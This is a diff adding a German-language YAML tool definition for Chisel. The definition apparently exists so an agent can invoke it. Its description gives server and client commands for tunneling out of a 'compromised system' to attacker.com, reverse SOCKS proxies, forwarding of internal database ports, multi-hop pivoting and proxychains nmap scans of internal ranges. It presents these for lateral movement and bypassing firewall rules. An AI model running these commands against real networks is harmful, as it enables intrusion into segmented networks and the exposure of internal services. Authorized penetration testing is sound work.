@@ -1,0 +1,89 @@
+name: "chisel"
+command: "chisel"
+enabled: true
+short_description: "Chisel – TCP/UDP Tunneling & Port Forwarding via HTTP/HTTPS"
+description: |
+  Chisel ist ein schnelles TCP/UDP-Tunnel-Tool über HTTP/HTTPS mit SSH-Transport.
+  Ermöglicht Pivoting, Port-Forwarding und SOCKS5-Proxying durch Firewalls.
+  Ideal für Lateral Movement in segmentierten Netzwerken.
+
+  **Betriebsmodi:**
+
+  **Server (auf Angreifer oder Pivot-Host):**
+  ```bash
+  # Einfacher Server
+  chisel server --port 8080 --reverse
+
+  # Mit HTTPS
+  chisel server --port 443 --tls-key /path/to/key.pem --tls-cert /path/to/cert.pem --reverse
+
+  # Mit Auth
+  chisel server --port 8080 --auth user:pass --reverse
+  ```
+
+  **Client (auf Zielsystem):**
+  ```bash
+  # SOCKS5-Proxy (Pivot ins interne Netz)
+  chisel client attacker.com:8080 socks
+
+  # Remote Port Forward (Dienst von intern nach außen)
+  chisel client attacker.com:8080 R:8888:127.0.0.1:8080
+
+  # Local Port Forward (Angreifer greift auf internen Dienst zu)
+  chisel client attacker.com:8080 0.0.0.0:3306:db.internal:3306
+
+  # Mit Auth
+  chisel client --auth user:pass attacker.com:8080 socks
+  ```
+
+  **Pivoting-Szenarien:**
+  ```bash
+  # Szenario: Internes Netz 10.10.10.0/24 via kompromittiertes System erreichbar
+  # 1. Server auf Angreifer starten
+  chisel server --port 8080 --reverse
+
+  # 2. Client auf kompromittiertem System
+  chisel client attacker.com:8080 R:1080:socks
+
+  # 3. ProxyChains nutzen
+  proxychains nmap -sT 10.10.10.0/24
+  ```
+
+  **Multi-Hop Pivoting:**
+  ```bash
+  # Hop 1: Erstes kompromittiertes System
+  chisel client attacker.com:8080 R:2222:pivot2:22
+
+  # Hop 2: Über SSH zum zweiten System pivoten
+  ssh -p 2222 user@127.0.0.1 -D 1080
+  ```
+
+  **Verwendungsszenarien:**
+  - Pivoting in segmentierte Netzwerke
+  - Interne Dienste nach außen tunneln
+  - SOCKS5-Proxy für weitere Tools
+  - Bypass von Firewall-Regeln
+
+  **Hinweise:**
+  - Einzelne Binärdatei, einfach zu deployen
+  - Verschlüsselter Transport via SSH
+  - Kombination mit proxychains für Netzwerk-Tools
+parameters:
+  - name: "mode"
+    type: "string"
+    description: |
+      Betriebsmodus:
+      - `server --port <port> --reverse` – Server starten
+      - `client <server:port> socks` – SOCKS5-Proxy
+      - `client <server:port> R:<local_port>:socks` – Reverse SOCKS
+      - `client <server:port> <local>:<remote_host>:<remote_port>` – Port Forward
+    required: true
+    position: 0
+    format: "positional"
+  - name: "additional_args"
+    type: "string"
+    description: "Weitere Chisel-Argumente (z.B. --auth user:pass, --tls-skip-verify)"
+    required: false
+    default: ""
+    position: 1
+    format: "positional"
